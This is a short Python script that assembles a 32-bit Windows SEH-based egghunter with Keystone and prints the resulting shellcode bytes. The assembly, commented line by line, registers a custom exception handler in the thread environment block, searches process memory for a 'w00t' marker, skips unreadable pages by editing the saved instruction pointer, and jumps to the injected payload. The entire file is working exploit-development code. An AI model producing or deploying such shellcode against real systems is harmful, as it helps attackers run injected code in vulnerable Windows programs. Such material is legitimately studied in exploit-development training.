from keystone import *
CODE = """
start: 
    jmp get_seh_address                 # jump to a negative call to dynamically obtain egghunter position
build_exception_record: 
    pop ecx                             # pop the address of the exception_handler into ecx
    mov eax, 0x74303077                 # mov signature into eax
    push ecx                            # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
    push 0xffffffff                     # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
    xor ebx, ebx                        # null out ebx
    mov dword ptr fs:[ebx], esp         # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
    sub ecx, 0x04                       # substract 0x04 from the pointer to exception handler
    add ebx, 0x04                       # add 0x04 to ebx
    mov dword ptr fs:[ebx], ecx         # overwrite the StackBase in the TEB
is_egg: 
    push 0x02                           # push 0x02
    pop ecx                             # pop the value into ecx which will act as a counter
    mov edi, ebx                        # mov memory address into edi
    repe scasd                          # check for our signature, if the page is invalid we trigger an exception and jump to our exception_handler function
    jnz loop_inc_one                    # if we didn't find signature, increase ebx and repeat
    jmp edi                             # we found our signature and will jump to it
loop_inc_page: 
    or bx, 0xfff                        # if page is invalid the exception_handler will update eip to point here and we move to next page
loop_inc_one: 
    inc ebx                             # increase ebx by one byte
    jmp is_egg                          # check for signature again
get_seh_address: 
    call build_exception_record         # call to a higher address to avoid null bytes & push return to obtain egghunter position
    push 0x0c                           # push 0x0c onto the stack
    pop ecx                             # pop the value into ecx
    mov eax, [esp+ecx]                  # mov into eax the pointer to the CONTEXT structure for our exception
    mov cl, 0xb8                        # mov 0xb8 into ecx which will act as an offset to the eip
    add dword ptr ds:[eax+ecx], 0x06    # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
    pop eax                             # save return value into eax
    add esp, 0x10                       # increase esp to clean the stack for our call
    push eax                            # push return value back into the stack
    xor eax, eax                        # null out eax to simulate ExceptionContinueExecution return
    ret                                 # return
"""

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding:
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print("Opcodes = (\""+ instructions + "\")")